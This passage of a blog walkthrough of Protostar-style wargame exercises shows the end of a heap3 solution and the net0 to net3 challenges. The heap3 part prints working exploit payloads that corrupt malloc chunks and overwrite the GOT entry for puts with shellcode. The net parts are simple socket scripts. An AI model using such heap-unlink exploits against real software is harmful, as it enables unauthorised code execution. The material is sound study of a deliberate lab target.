     0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
     0x804c030:  0x0804c050  0x00000000  0x00000000  0x00000000
     0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
     0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
     0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0c0:  0x00000000  0x00000000
</code></pre></div>    </div>
  </li>
  <li>We know that the memory is free, so we would expect all prev_size, size, fd and bk to be set properly. However, only fd actually is (also size is set, but does not signal the previous chunk as free): the reason is that these chunks are so small (less than 64 bytes) that they are not merged together upon freeing, but kept separated for the sake of speed. We can change this behaviour by controlling the size field and making it large enough to move the chunks from the so-called fastbin to the normal bin.</li>
  <li>However, there is a problem when trying to write the size and prev_size fields: to set them properly we need to use NULL bytes, but passing them as program arguments won’t work because they will be read as string terminators and whatever else is after that will not be read at all.</li>
  <li>The solution is a trick involving an integer overflow (as in this Phrack paper): passing the value 0xFFFFFFFC (-4 as a signed integer), malloc will cast it to unsigned int, meaning that -4 becomes bigger than 64. The least significant bit of 0xFFFFFFFC is not set, meaning that the previous chunk is free and the unlinking procedure will be called on it. However, the address of this previous chunk will be calculated by subtracting -4 (therefore actually adding 4) from the current chunk’s beginning (resulting in the allocator thinking that the previous chunk actually starts at 4 bytes past the start of the current chunk), and its size will also be -4.</li>
  <li>We target the second argument of heap3, so that we can exploit fd and bk when it is freed. The first argument is ‘AAAA’ and the last ‘DDDD’, to be easily recognizable. The middle argument is filled with As until the allocated memory is full; then the heap smashing bytes and a recognizable pattern as data.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA ' + 'A' * 32 + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + 'AAAABBBBCCCC' + ' DDD'"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
  <li>Running this results in a segmentation fault as the system tries to move stuff around in adresses that do not actually exist. If we disassemble main, we see that after freeing all the allocated memory there is one last call to puts. We want to redirect this call so that instead it executes winner.</li>
  <li>To get the address of winner we take a look at <code class="language-plaintext highlighter-rouge">objdump -t</code>, and see that it is located at 0x08048864. This is the address that we want to put instead of the puts entry in the GOT table, which is located at 0x0804b128 (obtained with objdump -R). The actual address that we want to overwrite is 0x0804b11c, because due to the fd-bk arithmetic we have to subtract 12 bytes from the memory address that we want to write to.</li>
  <li>We can’t just pass the winner address in the heap, because trying to write to it will cause a segmentation fault. Instead, we need to encode a call to it and a return. This can be done for example with an online assembler: <code class="language-plaintext highlighter-rouge">push 0x08048864 ; ret</code></li>
  <li>The encoded instructions correspond to \x68\x64\x88\x04\x08\xc3, which also nicely fits into the 8 bytes that are available. The resulting code is:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./heap3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">c3' + ' ' + 'A' * 32 + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + 'AAAA' + '</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + ' ' + 'DDD'"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>I have to admit that although the techniques used are mostly clear to me, I am still a bit confused about how all of it comes together. This code works, but breaking down the single parts and pointing where they will end up in memory is quite tricky.</p>

<h3 id="net-00">[Net 00]</h3>
<p>Converting strings to little endian integers</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net0"
#define UID 999
#define GID 999
#define PORT 2999
</span>
<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>

    <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Please send '%d' as a little endian 32bit int</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Thank you sir/madam</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"I'm sorry, you sent %d instead</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>

    <span class="cm">/* Run the process as a daemon */</span>
    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
    
    <span class="cm">/* Wait for socket activity and return */</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="cm">/* Don't do this :&gt; */</span>
    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

    <span class="n">run</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>What this program does is waiting for connections on port 2999, sending out a random number to whoever connects and expecting it sent back in little endian format. After launching net0, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2999.</code></li>
  <li>
    <p>To solve the challenge, we can implement a simple python program that connects to the deamon, reads the sent number and sends it back in little endian fashion:</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">re</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2999</span><span class="p">))</span>

 <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">num</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 <span class="n">num</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>
 <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
  <li>The data that we receive always has the same structure, so if we split it (creating a list containing the elements that were separated by spaces), we know that the number will always be the 3rd element of the list. Also, from that element we want to leave out the first and last character, that are the ticks. What is left can be easily converted to integer.</li>
  <li>From the it’s just a matter to use the “i” option when packing the data to be sent back.</li>
</ol>

<h3 id="net-01">[Net 01]</h3>
<p>Converting binary integers into ascii representation</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net1"
#define UID 998
#define GID 998
#define PORT 2998
</span>
<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>

    <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="s">"%d"</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you correctly sent the data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you didn't send the data properly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>

    <span class="cm">/* Run the process as a daemon */</span>
    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
    
    <span class="cm">/* Wait for socket activity and return */</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="cm">/* Don't do this :&gt; */</span>
    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

    <span class="n">run</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>What this program does is waiting for connections on port 2998, sending out a random number in little endian format, and expecting it sent back in ASCII format. After launching net1, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2998</code>.</li>
  <li>Also in this case we create a small python script that connects to the deamon, reads the data, manipulates it and sends it back.
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">re</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2998</span><span class="p">))</span>

 <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">num</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
  <li>The script unpacks the data reading it as an integer number, and then we just send it back as string.</li>
</ol>

<h3 id="net-02">[Net 02]</h3>
<p>Adding 4 unsigned 32-bit integers (Keep in mind that it wraps)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net2"
#define UID 997
#define GID 997
#define PORT 2997
</span>
<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">,</span> <span class="n">wanted</span><span class="p">;</span>

    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
        <span class="n">result</span> <span class="o">+=</span> <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

        <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":&lt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you added them correctly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"sorry, try again. invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>

    <span class="cm">/* Run the process as a daemon */</span>
    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
    
    <span class="cm">/* Wait for socket activity and return */</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="cm">/* Don't do this :&gt; */</span>
    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

    <span class="n">run</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>What this program does is waiting for connections on port 2997, sending 4 numbers that should be treated as unsigned integers, and expecting back the sum of those numbers. After launching net2, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2997</code>.</li>
  <li>Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">re</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2997</span><span class="p">))</span>

 <span class="n">tot</span> <span class="o">=</span> <span class="mi">0</span>
 <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
     <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
     <span class="n">tot</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

 <span class="n">tot</span> <span class="o">=</span> <span class="n">tot</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">tot</span><span class="p">))</span>
 <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
  <li>The script reads 4 times 4 bytes, corresponding to the length of usnigned int. We add the numbers to each other, and before sending the sum back we perform the ‘&amp; 0xFFFFFFFF’ to make clear of the possible overflows.</li>
</ol>

<h3 id="net-03">[Net 03]</h3>
<p>Implement a simple network protocol</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net3"
#define UID 996
#define GID 996
#define PORT 2996
</span>
<span class="cm">/*
    * Extract a null terminated string from the buffer 
    */</span>

<span class="kt">int</span> <span class="nf">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span>

    <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"badly formed packet"</span><span class="p">);</span>
    <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
    * Check to see if we can log into the host
    */</span>

<span class="kt">int</span> <span class="nf">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">resource</span><span class="p">,</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">success</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"invalid login packet length"</span><span class="p">);</span>

    <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
    <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>

    <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="s">"net3"</span><span class="p">);</span>
    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">"awesomesauce"</span><span class="p">);</span>
    <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">"password"</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>

    <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span>

    <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span>

    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
    
    <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
    <span class="n">v</span> <span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
